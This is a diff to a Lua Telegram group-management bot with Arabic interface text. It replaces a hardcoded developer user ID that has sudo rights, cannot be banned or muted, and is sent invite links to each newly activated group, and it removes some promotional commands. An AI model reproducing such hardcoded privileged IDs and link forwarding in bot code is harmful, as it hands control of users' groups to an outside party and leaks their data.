@@ -171,7 +171,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,1706080513,1957371228,1831228999,1936946115}   
+sudo_users = {SUDO,1706080513,1957371228,1831228999,1981394343}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -297,7 +297,7 @@ if tonumber(user_id) == tonumber(1706080513) then
 var = true 
 elseif tonumber(user_id) == tonumber(1957371228) then
 var = true  
-elseif tonumber(user_id) == tonumber(1936946115) then
+elseif tonumber(user_id) == tonumber(1981394343) then
 var = true  
 elseif tonumber(user_id) == tonumber(1831228999) then
 var = true  
@@ -341,7 +341,7 @@ if tonumber(user_id) == tonumber(1706080513) then
 var = 'مطور'
 elseif tonumber(user_id) == tonumber(1957371228) then  
 var = 'مطور السورس'
-elseif tonumber(user_id) == tonumber(1936946115) then  
+elseif tonumber(user_id) == tonumber(1981394343) then  
 var = 'المبرمج سمير'
 elseif tonumber(user_id) == tonumber(1831228999) then  
 var = 'مالك السورس'
@@ -2770,7 +2770,7 @@ Text = '◍ تم تفعيل جروب جديده\n'..
 '\n◍ الرابط {['..LinkGp..']}'
 if not SudoBot(msg) then
 sendText(SUDO,Text,0,'md')
-sendText(1936946115,Text,0,'md')
+sendText(1981394343,Text,0,'md')
 end
 end
 end,nil) 
@@ -2811,7 +2811,7 @@ Text = '\nتم تعطيل الجروب ◍ '..
 '\n◍ الرابط {['..LinkGp..']}'
 if not SudoBot(msg) then
 sendText(SUDO,Text,0,'md')
-sendText(1936946115,Text,0,'md')
+sendText(1981394343,Text,0,'md')
 end
 end
 end,nil) 
@@ -2911,7 +2911,7 @@ Text = '◍ تم تفعيل جروب جديده\n'..
 '\n◍ الرابط {['..LinkGp..']}'
 if not SudoBot(msg) then
 sendText(SUDO,Text,0,'md')
-sendText(1936946115,Text,0,'md')
+sendText(1981394343,Text,0,'md')
 end
 end
 end
@@ -3252,32 +3252,6 @@ local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/M_S_U1/13&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 
-if text == 'قناه الاستوري' or text == 'استوري سمير' or text == 'قناه الاستوريهات' or text == 'الاستوريهات' then 
-local Text = [[ 
-قناه الاستوري ياروحي 🌚💘
-]] 
-keyboard = {}  
-keyboard.inline_keyboard = { 
-{{text = '❨ استوري سمير  ❩', url="t.me/S_1_0M"}},
-{{text = 'اضف البوت الي مجموعتك ♡ ' ,url="t.me/"..dofile("./Bkar.lua").botUserName.."?startgroup=start"}},
-} 
-local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/M_S_U1/9&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-end
-
-if text == 'تيم سمير' or text == 'تيم' or text == 'متيجي' or text == 'اقوي تيم' then 
-local Text = [[ 
-[متيجي تنضم لتيم سمير اقوي تيم ع التليجرام](t.me/S_1_2M)
-]] 
-keyboard = {}  
-keyboard.inline_keyboard = { 
-{{text = '❨ 𝑬𝑳𝑴𝑼𝑺𝑳𝑰𝑴 𝑻𝑬𝑨𝑴  ❩', url="t.me/S_1_2M"}},
-{{text = 'اضف البوت الي مجموعتك ♡ ' ,url="t.me/"..dofile("./Bkar.lua").botUserName.."?startgroup=start"}},
-} 
-local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/M_S_U1/10&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-end
-
 if text == 'مين نصبلك' or text == 'عايزه بوت' or text == 'عايز بوت' then
 local Text = [[
  ♡ اهلا بك في سورس بكار الجمدان
@@ -3294,25 +3268,12 @@ local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/M_S_U1/8&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 
-if text == 'سمير' or text == 'سمير عصام' then
-local Text = [[
-[المبرمج سمير عصام](t.me/sameer_3ssam)
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = '❨ 𝗦𝗔𝗠𝗘𝗘𝗥 ❩',url="t.me/sameer_3ssam"}},
-{{text = '❨ اضف البوت لمجموعتك ❩', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
-}
-local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/sameer_3ssam/5&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-end
-
-if text ==  'المبرمج سمير' then
+if text == 'سمير عصام' or text == 'سمير' or text == 'المبرمج سمير' then
 local TEXT_SUD = database:get(bot_id..'Tshake:TEXT_SUDO')
 if TEXT_SUDO then 
 send(msg.chat_id_, msg.id_,TEXT_SUDO)
 else
-tdcli_function ({ID = "GetUser",user_id_ = 1936946115,},function(arg,result) 
+tdcli_function ({ID = "GetUser",user_id_ = 1981394343,},function(arg,result) 
 local function taha(extra, taha, success)
 if taha.photos_[0] then
 local Name = 'المبرمج 🌚💘\n['..result.first_name_..'](t.me/S_1_1M)\n'
@@ -3328,7 +3289,7 @@ https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..msg.
 else
 sendText(msg.chat_id_,Name,msg.id_/2097152/0.5,'md')
  end end
-tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = 1936946115, offset_ = 0, limit_ = 1 }, taha, nil)
+tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = 1981394343, offset_ = 0, limit_ = 1 }, taha, nil)
 end,nil)
 end
 end
@@ -5428,7 +5389,7 @@ if tonumber(result.sender_user_id_) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " ♡ لا تسطيع حظر البوت عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1936946115) then  
+if tonumber(result.sender_user_id_) == tonumber(1981394343) then  
 send(msg.chat_id_, msg.id_, " ♡ لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
@@ -5478,7 +5439,7 @@ if result.id_ == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " ♡ لا يمكنك حظر المطور الاساسي \n")
 return false 
 end
-if result.id_ == tonumber(1936946115) then
+if result.id_ == tonumber(1981394343) then
 send(msg.chat_id_, msg.id_, " ♡ لا يمكنك حظر مبرمج السورس \n")
 return false 
 end
@@ -5522,7 +5483,7 @@ if tonumber(userid) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " ♡ لا تسطيع حظر البوت عام")
 return false 
 end
-if tonumber(userid) == tonumber(1936946115) then  
+if tonumber(userid) == tonumber(1981394343) then  
 send(msg.chat_id_, msg.id_, " ♡ لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
@@ -5567,7 +5528,7 @@ if tonumber(result.sender_user_id_) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " ♡ لا تسطيع كتم البوت عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1936946115) then  
+if tonumber(result.sender_user_id_) == tonumber(1981394343) then  
 send(msg.chat_id_, msg.id_, " ♡ لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
@@ -5616,7 +5577,7 @@ if result.id_ == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " ♡ لا يمكنك كتم المطور الاساسي \n")
 return false 
 end
-if result.id_ == tonumber(1936946115) then
+if result.id_ == tonumber(1981394343) then
 send(msg.chat_id_, msg.id_, " ♡ لا يمكنك كتم مبرمج السورس \n")
 return false 
 end
@@ -5660,7 +5621,7 @@ if tonumber(userid) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " ♡ لا تسطيع كتم البوت عام")
 return false 
 end
-if tonumber(userid) == tonumber(1936946115) then  
+if tonumber(userid) == tonumber(1981394343) then  
 send(msg.chat_id_, msg.id_, " ♡ لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
@@ -13871,7 +13832,7 @@ local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
 send(msg.chat_id_, msg.id_,' 🌕 رتبتك في البوت ← '..rtp)
 end
 
-if tonumber(msg.sender_user_id_) == tonumber(1936946115) then
+if tonumber(msg.sender_user_id_) == tonumber(1981394343) then
 if text == 'انا مين' then
 local msg_id = msg.id_/2097152/0.5  
 local textt = '[انت المبرمج نن عيني 🥺🤍](t.me/UU_SD1)'
@@ -17410,7 +17371,7 @@ local Teext =[[
 مــــســـح قـــائـــمــه الــــعـــام🖤
 جــــلـــب نـــســـخــه الــاحــتــيــاطــيــه🖤
 رفــــع نـــســـخــه الــاحـــتــيـــاطـــيـــه🖤
-🧸 ≪━━━━☩𝑩𝑨𝑲𝑨𝑹☩━━━━≫ 🧸
+?? ≪━━━━☩𝑩𝑨𝑲𝑨𝑹☩━━━━≫ 🧸
 اذاعـــــه خــــاص💞
 اذاعــــه💞
 اذاعــــه بــالــــتـــوجـــيــه💞
